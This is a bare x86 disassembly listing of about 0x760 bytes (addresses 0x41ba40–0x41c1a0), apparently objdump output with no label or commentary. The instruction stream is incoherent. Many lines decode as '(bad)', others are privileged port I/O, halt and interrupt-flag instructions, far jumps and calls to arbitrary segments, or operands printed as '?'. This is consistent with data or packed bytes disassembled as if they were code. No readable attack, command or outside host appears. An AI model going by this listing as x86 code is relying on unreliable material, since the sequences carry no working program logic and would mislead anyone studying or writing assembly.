  41ba40:	mov    ebx,0xb3768ff9
  41ba45:	jno    0x41b9f4
  41ba47:	aam    0xc9
  41ba49:	sti    
  41ba4a:	pop    eax
  41ba4b:	out    0xc7,eax
  41ba4d:	std    
  41ba4e:	loopne 0x41b9d5
  41ba50:	fs sbb cl,al
  41ba53:	mov    cl,cl
  41ba55:	jmp    0xef0e:0xb5114078
  41ba5c:	ss cli 
  41ba5e:	mov    edi,0x9944f090
  41ba63:	xchg   ebx,eax
  41ba64:	add    DWORD PTR [ebx-0x2b],0x5d
  41ba68:	xor    eax,0x313aa2a6
  41ba6d:	lods   al,BYTE PTR ds:[esi]
  41ba6e:	adc    al,0x5d
  41ba70:	sti    
  41ba71:	dec    edx
  41ba72:	dec    esi
  41ba73:	cli    
  41ba74:	(bad)  
  41ba75:	cmc    
  41ba76:	inc    edx
  41ba77:	jg     0x41baef
  41ba79:	pop    esi
  41ba7a:	xor    eax,DWORD PTR [edi]
  41ba7c:	sub    DWORD PTR [eax+ebp*4-0x73],ebx
  41ba80:	mov    ch,0xd6
  41ba82:	leave  
  41ba83:	imul   DWORD PTR [ebx]
  41ba85:	dec    edi
  41ba86:	pop    esp
  41ba87:	retf   
  41ba88:	out    dx,al
  41ba89:	adc    DWORD PTR [ecx+0x72525959],esp
  41ba8f:	adc    bh,BYTE PTR [ecx-0x2740231f]
  41ba95:	inc    esi
  41ba96:	stos   DWORD PTR es:[edi],eax
  41ba97:	jo     0x41baf5
  41ba99:	pop    ebp
  41ba9a:	and    DWORD PTR [ebp-0x173dabfe],ebx
  41baa0:	leave  
  41baa1:	shl    cl,0x9f
  41baa4:	push   ss
  41baa5:	call   0xf5392b36
  41baaa:	xchg   edi,eax
  41baab:	mov    dh,0x76
  41baad:	retf   
  41baae:	mov    dh,0x22
  41bab0:	mov    cs,WORD PTR [ebp-0x30]
  41bab3:	adc    ch,ch
  41bab5:	sbb    esp,DWORD PTR ds:0x10feb0c1
  41babb:	add    ebx,eax
  41babd:	dec    ebx
  41babe:	es popa 
  41bac0:	bound  esp,QWORD PTR [edx+0x4c]
  41bac3:	push   esi
  41bac4:	(bad)  
  41bac5:	dec    ecx
  41bac6:	movhps QWORD PTR [esi],xmm6
  41bac9:	dec    esi
  41baca:	push   edi
  41bacb:	dec    edx
  41bacc:	fbld   TBYTE PTR [ecx]
  41bace:	ins    BYTE PTR es:[edi],dx
  41bacf:	cmp    eax,0x4ac22aec
  41bad4:	pop    edi
  41bad5:	and    BYTE PTR [esi-0x7d],bl
  41bad8:	inc    ecx
  41bad9:	mov    bh,0x1d
  41badb:	sub    DWORD PTR [ebp+0x169396b1],ebp
  41bae1:	mov    ch,0x49
  41bae3:	daa    
  41bae4:	mov    esp,0x8f8a21e2
  41bae9:	and    ebx,ecx
  41baeb:	xchg   ebp,eax
  41baec:	jp     0x41bb1f
  41baee:	jae    0x41bb42
  41baf0:	mov    WORD PTR [ecx],?
  41baf2:	(bad)  
  41baf3:	jmp    FWORD PTR [eax+0x1845c8a9]
  41baf9:	jl     0x41bae9
  41bafb:	or     eax,0xf7cfb576
  41bb00:	pop    eax
  41bb01:	rol    DWORD PTR [ebp-0x20],1
  41bb04:	das    
  41bb05:	cdq    
  41bb06:	shr    DWORD PTR [ecx],0x91
  41bb09:	std    
  41bb0a:	retf   0x1765
  41bb0d:	jl     0x41ba98
  41bb0f:	jbe    0x41bb8e
  41bb11:	aas    
  41bb12:	mov    eax,cs:0xdd902bdd
  41bb18:	xor    BYTE PTR [ebp-0x29],ah
  41bb1b:	int    0x92
  41bb1d:	inc    ebp
  41bb1e:	lock xchg ebp,eax
  41bb20:	dec    edi
  41bb21:	fisubr DWORD PTR [ebx]
  41bb23:	fucomip st,st(3)
  41bb25:	and    DWORD PTR fs:[ebp+0x3356bb35],0x4f
  41bb2d:	push   edi
  41bb2e:	lds    esp,FWORD PTR [eax]
  41bb30:	jne    0x41bafe
  41bb32:	pop    ebx
  41bb33:	sub    al,0x1c
  41bb35:	or     edi,esp
  41bb37:	cmp    BYTE PTR [ecx-0x53a2c122],dh
  41bb3d:	adc    al,0x60
  41bb3f:	lock and al,0x1c
  41bb42:	in     eax,0xf
  41bb44:	ss xor al,0xa
  41bb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb48:	pop    esi
  41bb49:	test   DWORD PTR [ebx+0x2d],edx
  41bb4c:	xchg   edx,eax
  41bb4d:	ror    WORD PTR [eax-0x62],cl
  41bb51:	jp     0x41bb00
  41bb53:	mov    al,0xdd
  41bb55:	mov    eax,ds:0x2bf9dfe1
  41bb5a:	ret    0x154
  41bb5d:	mov    dl,0x9
  41bb5f:	nop
  41bb60:	aad    0x33
  41bb62:	mov    esp,0xd0209e80
  41bb67:	xchg   bl,al
  41bb69:	xor    BYTE PTR [esi+0x72],ch
  41bb6c:	jg     0x41bba0
  41bb6e:	stos   DWORD PTR es:[edi],eax
  41bb6f:	push   esp
  41bb70:	and    ah,0xf6
  41bb73:	repz add al,0x8b
  41bb76:	xchg   ecx,eax
  41bb77:	les    ecx,FWORD PTR [eax+eiz*4+0x7ab007dc]
  41bb7e:	xchg   ecx,eax
  41bb7f:	call   0xab2f:0x3671211e
  41bb86:	mov    ebp,0xfc4de84d
  41bb8b:	push   ecx
  41bb8c:	and    BYTE PTR [eax+0x61fa0d0],0xa3
  41bb93:	and    bh,BYTE PTR [ecx]
  41bb95:	ins    DWORD PTR es:[edi],dx
  41bb96:	les    esp,FWORD PTR cs:[ebp+esi*1-0x4b]
  41bb9b:	lds    esi,FWORD PTR [ebx+0x55b46172]
  41bba1:	test   BYTE PTR [edx],ch
  41bba3:	jo     0x41bb88
  41bba5:	fwait
  41bba6:	sbb    eax,0x5274a26d
  41bbab:	add    dh,BYTE PTR [edi-0x4]
  41bbae:	add    edi,DWORD PTR [edi]
  41bbb0:	cdq    
  41bbb1:	popf   
  41bbb2:	inc    esp
  41bbb3:	(bad)  
  41bbb4:	xor    bl,bh
  41bbb6:	loope  0x41bbe4
  41bbb8:	call   0x6fc0:0x714522f6
  41bbbf:	out    0x96,eax
  41bbc1:	(bad)  
  41bbc2:	icebp  
  41bbc3:	pop    edx
  41bbc4:	inc    eax
  41bbc5:	and    dh,ah
  41bbc7:	je     0x41bbb6
  41bbc9:	int    0x58
  41bbcb:	push   0x78a6314
  41bbd0:	fidiv  DWORD PTR [eax-0x75]
  41bbd3:	pop    ebp
  41bbd4:	sbb    BYTE PTR [eax],bh
  41bbd6:	xor    BYTE PTR [ebx-0x27339573],ah
  41bbdc:	mov    cs,WORD PTR [edi]
  41bbde:	mov    WORD PTR [edx-0x7a],?
  41bbe1:	xchg   DWORD PTR [esi+0xd],eax
  41bbe4:	push   es
  41bbe5:	test   eax,0xa3c9a804
  41bbea:	cmp    esi,eax
  41bbec:	mov    al,BYTE PTR [edx]
  41bbee:	sub    eax,0x2627d5e
  41bbf3:	cmp    al,0xc3
  41bbf5:	arpl   WORD PTR [esi-0x53],di
  41bbf8:	lea    esp,[edx+0x6b]
  41bbfb:	mov    eax,0x15fa8fe1
  41bc00:	cld    
  41bc01:	pop    ebx
  41bc02:	cdq    
  41bc03:	hlt    
  41bc04:	sub    bl,bh
  41bc06:	sbb    al,0x7c
  41bc08:	jg     0x41bc74
  41bc0a:	adc    ch,al
  41bc0c:	jp     0x41bc64
  41bc0e:	jl     0x41bc20
  41bc10:	xor    DWORD PTR [eax-0x5f599598],edx
  41bc16:	jle    0x41bc85
  41bc18:	in     eax,dx
  41bc19:	adc    al,0xfe
  41bc1b:	test   al,0xbd
  41bc1d:	adc    edx,DWORD PTR [edx+0x70]
  41bc20:	xor    ecx,DWORD PTR [edi]
  41bc22:	add    ch,dl
  41bc24:	repz mov esi,0x795333e8
  41bc2a:	loope  0x41bbce
  41bc2c:	test   eax,0xe08893f6
  41bc31:	aad    0xec
  41bc33:	fld    DWORD PTR [ebp-0x22bd5c2e]
  41bc39:	xor    BYTE PTR ds:0x242da7f3,cl
  41bc3f:	inc    eax
  41bc40:	jne    0x41bc3f
  41bc42:	nop
  41bc43:	push   esp
  41bc44:	sub    ebx,DWORD PTR ds:0xe90478f3
  41bc4a:	dec    ebx
  41bc4b:	push   edx
  41bc4c:	js     0x41bc45
  41bc4e:	cmp    BYTE PTR [eax-0x74],0xa3
  41bc52:	int3   
  41bc53:	outs   dx,BYTE PTR ds:[esi]
  41bc54:	ja     0x41bc83
  41bc56:	fidivr DWORD PTR [ecx]
  41bc58:	ins    BYTE PTR es:[edi],dx
  41bc59:	jmp    FWORD PTR [ebp-0x33]
  41bc5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5d:	or     DWORD PTR [eax-0x4d8d51bd],esi
  41bc63:	fld    TBYTE PTR fs:[esi+0x7]
  41bc67:	aas    
  41bc68:	jbe    0x41bccc
  41bc6a:	stos   BYTE PTR es:[edi],al
  41bc6b:	xchg   ebp,eax
  41bc6c:	scas   al,BYTE PTR es:[edi]
  41bc6d:	pop    edx
  41bc6e:	aaa    
  41bc6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc70:	(bad)  
  41bc71:	mov    ebx,0x14af9fdd
  41bc76:	xor    DWORD PTR ds:0x5d987af3,0xb9bfd4e0
  41bc80:	xchg   ebp,eax
  41bc81:	sub    DWORD PTR [edx+0x13],edi
  41bc84:	jmp    0x2eff:0x8a6a591e
  41bc8b:	retf   0xd101
  41bc8e:	je     0x41bcbf
  41bc90:	cmp    BYTE PTR fs:0x563ecc36,al
  41bc97:	adc    al,BYTE PTR [edi-0x4b]
  41bc9a:	or     al,0x2f
  41bc9c:	fiadd  DWORD PTR [edx-0x4317b81c]
  41bca2:	or     al,0x3f
  41bca4:	pop    ecx
  41bca5:	mov    WORD PTR [ebp-0x493ab4ee],gs
  41bcab:	mov    WORD PTR [ebx],gs
  41bcad:	xor    al,0xdf
  41bcaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb0:	and    DWORD PTR [edi],edi
  41bcb2:	test   eax,0xafbedc1d
  41bcb7:	push   DWORD PTR [ecx]
  41bcb9:	leave  
  41bcba:	loope  0x41bc8a
  41bcbc:	adc    DWORD PTR [esi],ebp
  41bcbe:	push   0xffffffe5
  41bcc0:	sub    edx,DWORD PTR [eax]
  41bcc2:	(bad)  
  41bcc3:	push   ebp
  41bcc4:	push   0x15b5405c
  41bcc9:	in     al,0xe7
  41bccb:	dec    ecx
  41bccc:	stc    
  41bccd:	xchg   edi,eax
  41bcce:	ss lahf 
  41bcd0:	sub    al,0x9
  41bcd2:	fwait
  41bcd3:	cwde   
  41bcd4:	aas    
  41bcd5:	and    edi,esi
  41bcd7:	sbb    al,BYTE PTR [ebx+esi*4-0x7122726c]
  41bcde:	jne    0x41bced
  41bce0:	enter  0x83e4,0x86
  41bce4:	aaa    
  41bce5:	call   0xec2c15ac
  41bcea:	aam    0xe3
  41bcec:	pop    ecx
  41bced:	rol    ecx,cl
  41bcef:	sbb    bl,bl
  41bcf1:	push   ecx
  41bcf2:	cld    
  41bcf3:	xor    BYTE PTR [eax],0xbc
  41bcf6:	icebp  
  41bcf7:	xchg   DWORD PTR [edx-0x59],ecx
  41bcfa:	mov    ds:0x2d4ffa45,al
  41bcff:	dec    edx
  41bd00:	bound  esi,QWORD PTR [ecx+0x61]
  41bd03:	cli    
  41bd04:	fcmovne st,st(5)
  41bd06:	stc    
  41bd07:	push   0xffffff9f
  41bd09:	dec    esp
  41bd0a:	rcr    eax,0x8a
  41bd0d:	push   eax
  41bd0e:	sbb    BYTE PTR [edi+0x22],al
  41bd11:	into   
  41bd12:	dec    edi
  41bd13:	daa    
  41bd14:	pop    eax
  41bd15:	out    0x11,al
  41bd17:	inc    edi
  41bd18:	ficomp WORD PTR [ebx+0x5d9cabd9]
  41bd1e:	pop    edi
  41bd1f:	lea    edi,[bp+si]
  41bd22:	jmp    0x41bd33
  41bd24:	mov    ds:0x42b0c53e,al
  41bd29:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41bd2b:	or     eax,0x3d187881
  41bd30:	sbb    BYTE PTR [ecx+0x6f],cl
  41bd33:	cmp    eax,0xdb5be939
  41bd38:	jne    0x41bcfd
  41bd3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd3b:	gs aas 
  41bd3d:	enter  0xee8a,0x7b
  41bd41:	mov    ah,0xf3
  41bd43:	xor    dl,BYTE PTR [ebp-0x47]
  41bd46:	inc    esi
  41bd47:	jecxz  0x41bd3f
  41bd49:	outs   dx,BYTE PTR ds:[esi]
  41bd4a:	jecxz  0x41bcdc
  41bd4c:	retf   
  41bd4d:	aad    0x83
  41bd4f:	mov    al,0xab
  41bd51:	(bad)  
  41bd52:	sbb    ebx,ebx
  41bd54:	mov    ah,0xb2
  41bd56:	call   0x80d0:0x663ce13e
  41bd5d:	mov    ds:0xd7bf1f92,al
  41bd62:	rol    esi,0xf2
  41bd65:	add    dl,dh
  41bd67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd68:	int3   
  41bd69:	aas    
  41bd6a:	loope  0x41bd65
  41bd6c:	sbb    DWORD PTR [ebx],ecx
  41bd6e:	adc    esp,edi
  41bd70:	sahf   
  41bd71:	cwde   
  41bd72:	and    ebp,DWORD PTR [ecx-0x4d41281e]
  41bd78:	aaa    
  41bd79:	xor    BYTE PTR [eax+ebp*8+0x2f],al
  41bd7d:	jecxz  0x41bdb6
  41bd7f:	sbb    al,0xf7
  41bd81:	outs   dx,BYTE PTR ds:[esi]
  41bd82:	ror    BYTE PTR [ebp+0x6d4ddc5d],1
  41bd88:	adc    al,0x73
  41bd8a:	jbe    0x41bda2
  41bd8c:	aaa    
  41bd8d:	enter  0x69a8,0xad
  41bd91:	fadd   st(1),st
  41bd93:	jbe    0x41bdab
  41bd95:	dec    edx
  41bd96:	(bad)
  41bd99:	sub    eax,0x57e852e8
  41bd9e:	call   0x7a9a:0x147ed91f
  41bda5:	and    BYTE PTR [ebp-0x2f],bl
  41bda8:	sub    al,dl
  41bdaa:	paddq  mm4,QWORD PTR [ecx+0x2e1cb7a1]
  41bdb1:	loop   0x41bdeb
  41bdb3:	loope  0x41bd35
  41bdb5:	outs   dx,BYTE PTR ds:[esi]
  41bdb6:	mov    eax,ds:0x863a845e
  41bdbb:	out    dx,al
  41bdbc:	jno    0x41bda4
  41bdbe:	out    dx,ax
  41bdc0:	pop    ecx
  41bdc1:	es push edx
  41bdc3:	outs   dx,BYTE PTR ds:[esi]
  41bdc4:	es adc eax,0xc7411cad
  41bdca:	arpl   ax,cx
  41bdcc:	aaa    
  41bdcd:	xor    DWORD PTR [esi+edi*4-0x26],ebp
  41bdd1:	adc    eax,edi
  41bdd3:	sti    
  41bdd4:	push   esp
  41bdd5:	fisub  WORD PTR [ebx]
  41bdd7:	push   ecx
  41bdd8:	and    al,0xaa
  41bdda:	mov    esi,0x6c8cf03c
  41bddf:	push   ss
  41bde0:	pop    ss
  41bde1:	cmp    bh,cl
  41bde3:	inc    esi
  41bde4:	cmp    eax,DWORD PTR [ebp+0x7897aff6]
  41bdea:	adc    eax,0xab08a599
  41bdef:	xchg   DWORD PTR [ebx+edi*2+0x2a3ab70f],ebp
  41bdf6:	out    dx,al
  41bdf7:	popa   
  41bdf8:	jle    0x41bd88
  41bdfa:	ret    
  41bdfb:	rol    DWORD PTR [ebp-0x6810ddfe],1
  41be01:	aaa    
  41be02:	or     BYTE PTR [edi],bl
  41be04:	outs   dx,DWORD PTR ds:[esi]
  41be05:	rcl    DWORD PTR [esi],0x1a
  41be08:	jmp    0x41be13
  41be0a:	xchg   edx,eax
  41be0b:	fstp   TBYTE PTR [eax-0x80]
  41be0e:	cmp    DWORD PTR [edx-0x528714fe],0x193e18ea
  41be18:	dec    edx
  41be19:	sub    esp,eax
  41be1b:	xor    ecx,DWORD PTR cs:[ebx]
  41be1e:	ins    BYTE PTR es:[edi],dx
  41be1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be20:	pop    edi
  41be21:	popf   
  41be22:	jo     0x41be45
  41be24:	rol    DWORD PTR [ebx],0x8f
  41be27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be28:	mov    WORD PTR [ecx+0xd],gs
  41be2b:	cli    
  41be2c:	les    ebx,FWORD PTR [edx-0x3e7a5444]
  41be32:	add    al,0x68
  41be34:	sub    DWORD PTR gs:[eax+0x59ccb4e],esp
  41be3b:	mov    ch,0x27
  41be3d:	xor    DWORD PTR [ecx+0x1],0x814d5ed3
  41be44:	mov    ebx,0xfb5d5d27
  41be49:	fsubr  st(4),st
  41be4b:	push   0x50c68763
  41be50:	adc    al,0xf5
  41be52:	or     DWORD PTR [edx-0x76],edi
  41be55:	in     al,0xbc
  41be57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be59:	arpl   WORD PTR [edi+0x10],ax
  41be5c:	jmp    0x41bebc
  41be5e:	dec    esi
  41be5f:	and    BYTE PTR [edi+0x6d],ah
  41be62:	inc    edx
  41be63:	push   edi
  41be64:	leave  
  41be65:	push   ebp
  41be66:	mov    ecx,0x518a3cfa
  41be6b:	push   edi
  41be6c:	dec    ebx
  41be6d:	adc    ah,ah
  41be6f:	cwde   
  41be70:	xchg   edx,eax
  41be71:	adc    BYTE PTR [edx-0x6754b77a],dl
  41be77:	xchg   ebx,eax
  41be78:	xor    DWORD PTR [edi-0x135edbaa],0x24db8042
  41be82:	int    0xca
  41be84:	dec    ebx
  41be85:	push   esp
  41be86:	and    al,0xdc
  41be88:	lock sub eax,0x70c77b1e
  41be8e:	and    dh,BYTE PTR [ebx-0x16c2666e]
  41be94:	pop    es
  41be95:	out    0x3f,al
  41be97:	mov    eax,0x18449c66
  41be9c:	pop    es
  41be9d:	mov    ds:0xbc6f0aca,al
  41bea2:	fmulp  st(0),st
  41bea4:	adc    BYTE PTR [ebx-0x1faebe30],dh
  41beaa:	bound  ebp,QWORD PTR [edx+0x55]
  41bead:	ss (bad) 
  41beaf:	popa   
  41beb0:	(bad)  
  41beb1:	xor    al,0x49
  41beb3:	push   cs
  41beb4:	mov    edi,0x9db75295
  41beb9:	lods   al,BYTE PTR ds:[esi]
  41beba:	or     al,0x5a
  41bebc:	jnp    0x41be5a
  41bebe:	mov    esi,0x8e26d551
  41bec3:	pop    es
  41bec4:	jnp    0x41bef3
  41bec6:	mov    ebp,DWORD PTR [ebx+0x414ac94c]
  41becc:	lock inc ebp
  41bece:	xchg   BYTE PTR [ecx+0x503e7452],dl
  41bed4:	add    DWORD PTR [edx],esp
  41bed6:	cmp    al,0x7
  41bed8:	or     al,0xe5
  41beda:	pop    eax
  41bedb:	enter  0x2897,0x30
  41bedf:	push   ebp
  41bee0:	ds out 0xaf,eax
  41bee3:	in     eax,0x17
  41bee5:	pop    ebx
  41bee6:	imul   esi,DWORD PTR [esp+esi*2-0x298ac50d],0xcba2c15
  41bef1:	pop    ebp
  41bef2:	rcl    ecx,cl
  41bef4:	nop
  41bef5:	rcr    cl,0x1a
  41bef8:	loope  0x41bf2e
  41befa:	(bad)  
  41befb:	xchg   ecx,eax
  41befc:	mov    edx,0xf267b70e
  41bf01:	ficom  WORD PTR [ecx+0x67]
  41bf04:	or     esi,DWORD PTR [ebx-0x3b]
  41bf07:	push   es
  41bf08:	jnp    0x41bf36
  41bf0a:	jbe    0x41bea8
  41bf0c:	into   
  41bf0d:	(bad)  
  41bf0e:	sbb    eax,ebx
  41bf10:	pop    ecx
  41bf11:	loope  0x41bf0d
  41bf13:	adc    esp,DWORD PTR [ebp+0x59]
  41bf16:	xor    bl,al
  41bf18:	popa   
  41bf19:	and    DWORD PTR [ebp-0x2a],edi
  41bf1c:	push   eax
  41bf1d:	(bad)  
  41bf1e:	pop    edi
  41bf1f:	sbb    DWORD PTR [edi+eax*8-0x56],ebp
  41bf23:	imul   edi,DWORD PTR [ecx-0x5d240c71],0xfffffffd
  41bf2a:	pop    es
  41bf2b:	lods   al,BYTE PTR ds:[esi]
  41bf2c:	jnp    0x41bf6a
  41bf2e:	xchg   ecx,eax
  41bf2f:	jb     0x41bec2
  41bf31:	scas   eax,DWORD PTR es:[edi]
  41bf32:	js     0x41bf77
  41bf34:	push   eax
  41bf35:	(bad)  
  41bf36:	in     al,0xd0
  41bf38:	add    al,0x76
  41bf3a:	(bad)  
  41bf3b:	mov    ebx,0x26030a38
  41bf40:	(bad)
  41bf45:	sub    DWORD PTR [edi],eax
  41bf47:	mov    ds:0x66ce3610,al
  41bf4c:	test   DWORD PTR [ecx],esi
  41bf4e:	sbb    al,0xf8
  41bf50:	mov    esp,0xd9707ea1
  41bf55:	fidivr DWORD PTR [ecx+0x554949b3]
  41bf5b:	in     al,0xea
  41bf5d:	xchg   edx,eax
  41bf5e:	sub    BYTE PTR [ebx-0x20188dbb],ch
  41bf64:	ret    0x2af1
  41bf67:	xchg   ebx,eax
  41bf68:	arpl   WORD PTR [esi+0x45],dx
  41bf6b:	mov    edi,0x72288c25
  41bf70:	xchg   edx,eax
  41bf71:	(bad)  
  41bf72:	std    
  41bf73:	push   esp
  41bf74:	sbb    al,0x41
  41bf77:	push   eax
  41bf78:	push   es
  41bf79:	mov    ecx,0x4d4a40c7
  41bf7e:	mov    dl,0xf6
  41bf80:	mov    BYTE PTR [ecx],al
  41bf82:	xchg   esp,eax
  41bf83:	xchg   edx,eax
  41bf84:	and    esp,DWORD PTR [esi+edx*4-0x32]
  41bf88:	in     al,dx
  41bf89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf8a:	repz jle 0x41bf35
  41bf8d:	add    al,0x9
  41bf8f:	mov    WORD PTR [ebx-0x52446500],ds
  41bf95:	ss test ebp,0xaa5567d4
  41bf9c:	mov    esp,0xa1847b4f
  41bfa1:	stos   DWORD PTR es:[edi],eax
  41bfa2:	iret   
  41bfa3:	push   esi
  41bfa4:	inc    esp
  41bfa5:	push   dx
  41bfa7:	cmp    BYTE PTR [ecx],ch
  41bfa9:	mov    ah,BYTE PTR [edi+0x68]
  41bfac:	bound  esp,QWORD PTR [ebx-0x1a018f3]
  41bfb2:	imul   edi,ebx,0x206dff6b
  41bfb8:	mov    es,esp
  41bfba:	and    dh,BYTE PTR [ebp+ebx*2-0xc9bd1f0]
  41bfc1:	xchg   ebx,eax
  41bfc2:	ins    DWORD PTR es:[edi],dx
  41bfc3:	pop    edi
  41bfc4:	pop    edi
  41bfc5:	pop    edx
  41bfc6:	mov    eax,0x43538881
  41bfcb:	xor    DWORD PTR [esi+0x7d],ecx
  41bfce:	mov    edi,0xcbe0a00b
  41bfd3:	nop
  41bfd4:	frstor [esi-0x3686326b]
  41bfda:	jle    0x41bf67
  41bfdc:	cli    
  41bfdd:	or     edx,DWORD PTR es:[edi+0x38]
  41bfe1:	pop    es
  41bfe2:	outs   dx,BYTE PTR ds:[esi]
  41bfe3:	xor    eax,0xa64d19bd
  41bfe8:	adc    DWORD PTR [ebx+0x0],edi
  41bfeb:	and    esi,0xaed0274d
  41bff1:	not    dh
  41bff3:	call   0x3c70ea95
  41bff8:	fist   DWORD PTR [ebx]
  41bffa:	dec    esi
  41bffb:	out    dx,eax
  41bffc:	in     eax,dx
  41bffd:	and    ebp,DWORD PTR [ecx+eax*4]
  41c000:	mov    al,ds:0x5a7007f4
  41c005:	leave  
  41c006:	and    DWORD PTR [ecx+0x56b4da1c],edx
  41c00c:	jge    0x41c080
  41c00e:	sub    BYTE PTR [eax-0x57668ac9],ah
  41c014:	add    BYTE PTR [esi-0x26],0x15
  41c018:	aas    
  41c019:	lods   al,BYTE PTR ds:[esi]
  41c01a:	mov    ebp,0x6880a21a
  41c01f:	pop    ecx
  41c020:	arpl   ax,di
  41c022:	out    dx,eax
  41c023:	and    DWORD PTR [ebp+0x57],edi
  41c026:	sbb    ch,BYTE PTR [eax-0x3ef82c05]
  41c02c:	(bad)  
  41c02d:	dec    esp
  41c02e:	(bad)  
  41c02f:	jno    0x41c03e
  41c031:	idiv   BYTE PTR [ecx-0x13951fdc]
  41c037:	dec    esi
  41c038:	cmp    edi,DWORD PTR [edi]
  41c03a:	bound  edx,QWORD PTR [ebx-0x55]
  41c03d:	add    ecx,DWORD PTR [ebp+0x471567fb]
  41c043:	in     al,dx
  41c044:	xchg   ebp,eax
  41c045:	push   ecx
  41c046:	xchg   ebx,eax
  41c047:	push   eax
  41c048:	pop    esi
  41c049:	retf   
  41c04a:	pop    ecx
  41c04b:	int    0x30
  41c04d:	cdq    
  41c04e:	inc    ebx
  41c04f:	dec    edi
  41c050:	loopne 0x41bff8
  41c052:	sbb    ebp,DWORD PTR [eax+0x1c]
  41c055:	cmova  ebp,DWORD PTR [eax+0x2e787e5b]
  41c05c:	ret    0xfdf0
  41c05f:	push   ds
  41c060:	jb     0x41bff5
  41c062:	idiv   al
  41c064:	pop    eax
  41c065:	gs add al,ch
  41c068:	pop    ss
  41c069:	fiadd  DWORD PTR [edx+0x64]
  41c06c:	loop   0x41c00b
  41c06e:	dec    esi
  41c06f:	mov    eax,0x614df328
  41c074:	push   DWORD PTR [edx+0x33416dc2]
  41c07a:	out    0x39,eax
  41c07c:	pop    es
  41c07d:	push   esp
  41c07e:	ret    
  41c07f:	sub    al,0xb2
  41c081:	rol    BYTE PTR [eax],0xa1
  41c084:	nop
  41c085:	mov    WORD PTR [edx+0x5c],es
  41c088:	sub    edi,DWORD PTR [ebp-0x17]
  41c08b:	push   cs
  41c08c:	xchg   BYTE PTR [edi-0x7c0c845b],al
  41c092:	push   edi
  41c093:	xor    bl,dl
  41c095:	jb     0x41c0e1
  41c097:	enter  0x889b,0x4c
  41c09b:	ror    ch,1
  41c09d:	mov    dh,0x86
  41c09f:	and    dh,BYTE PTR [ecx+0x3f80d5c8]
  41c0a5:	fs pop edx
  41c0a7:	imul   eax,ebp,0xe4b01c3
  41c0ad:	inc    esi
  41c0ae:	adc    BYTE PTR [ecx+0x3f],al
  41c0b1:	test   edi,0x413d24ec
  41c0b7:	xor    ch,BYTE PTR [eax]
  41c0b9:	xchg   edx,eax
  41c0ba:	xchg   ebp,eax
  41c0bb:	aam    0x1d
  41c0bd:	mov    bh,0x76
  41c0bf:	fcom   DWORD PTR [edi-0x3e2540ce]
  41c0c5:	std    
  41c0c6:	ficomp DWORD PTR [ebx]
  41c0c8:	jne    0x41c06a
  41c0ca:	xor    ch,BYTE PTR gs:[ebx+0x293f2792]
  41c0d1:	cmp    edx,DWORD PTR [di]
  41c0d4:	fsub   QWORD PTR [ebx+0x11]
  41c0d7:	sub    BYTE PTR [esp+eax*8],dl
  41c0da:	sub    DWORD PTR [ebp+0x21],edi
  41c0dd:	mov    ebx,edx
  41c0df:	sbb    eax,0x4f6ddca6
  41c0e4:	xlat   BYTE PTR ds:[ebx]
  41c0e5:	int    0xd0
  41c0e7:	mov    edi,0xfb345f2f
  41c0ec:	mov    dh,0xb0
  41c0ee:	lahf   
  41c0ef:	aaa    
  41c0f0:	xor    edx,DWORD PTR [esp+edi*4-0x57]
  41c0f4:	push   es
  41c0f5:	stos   DWORD PTR es:[edi],eax
  41c0f6:	mov    esp,0xd2f4f564
  41c0fb:	push   ds
  41c0fc:	popf   
  41c0fd:	loop   0x41c165
  41c0ff:	or     BYTE PTR [edx+0x3ebc3a02],ch
  41c105:	loopne 0x41c0c4
  41c107:	mov    esi,0x3dea7352
  41c10c:	sub    DWORD PTR [ebx-0x4c],ebp
  41c10f:	jns    0x41c134
  41c111:	adc    ebp,esi
  41c113:	mul    DWORD PTR [ecx-0x46e3b1f1]
  41c119:	test   al,0x8a
  41c11b:	xchg   ecx,eax
  41c11c:	mov    ebx,0xbc4dad5b
  41c121:	and    BYTE PTR [edx],bl
  41c123:	or     esp,DWORD PTR ds:0x5ee02490
  41c129:	outs   dx,DWORD PTR ds:[esi]
  41c12a:	push   ss
  41c12b:	mov    al,0x1c
  41c12d:	jbe    0x41c0f5
  41c12f:	add    BYTE PTR [esi],ah
  41c131:	imul   eax,ebp,0x114f6f2d
  41c137:	mov    eax,0x3dffe6f5
  41c13c:	dec    ecx
  41c13d:	lods   al,BYTE PTR ds:[esi]
  41c13e:	cmp    ch,0xde
  41c141:	mov    eax,ds:0x1d51a483
  41c146:	adc    al,0x50
  41c148:	icebp  
  41c149:	sahf   
  41c14a:	cdq    
  41c14b:	inc    eax
  41c14c:	lea    ebp,[edx+0x71]
  41c14f:	xchg   ecx,eax
  41c150:	cld    
  41c151:	in     eax,dx
  41c152:	cmp    al,BYTE PTR ds:0x95ae229c
  41c158:	loop   0x41c18d
  41c15a:	cmp    BYTE PTR [ebx],cl
  41c15c:	(bad)  
  41c15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c15e:	shr    BYTE PTR [ecx+ebp*2+0x5a],1
  41c162:	mov    cl,dl
  41c164:	or     ecx,esi
  41c166:	inc    edx
  41c167:	jmp    0x756dbef9
  41c16c:	stc    
  41c16d:	fs (bad) 
  41c16f:	hlt    
  41c170:	mov    dl,0x1d
  41c172:	push   0xcbacdd41
  41c177:	xlat   BYTE PTR ds:[ebx]
  41c178:	mov    ch,0x58
  41c17a:	dec    eax
  41c17b:	shr    DWORD PTR ds:0x8c837666,0xbe
  41c182:	and    BYTE PTR [edx],cl
  41c184:	adc    cl,ah
  41c186:	loope  0x41c1e4
  41c188:	sub    eax,DWORD PTR [ebp-0x18]
  41c18b:	xchg   DWORD PTR [edx+0xe7f51fe],esp
  41c191:	or     esi,DWORD PTR [edx+0x3a3f5cba]
  41c197:	(bad)  
  41c198:	call   0x74ecfad8
  41c19d:	sbb    ah,0x99
  41c1a0:	std    
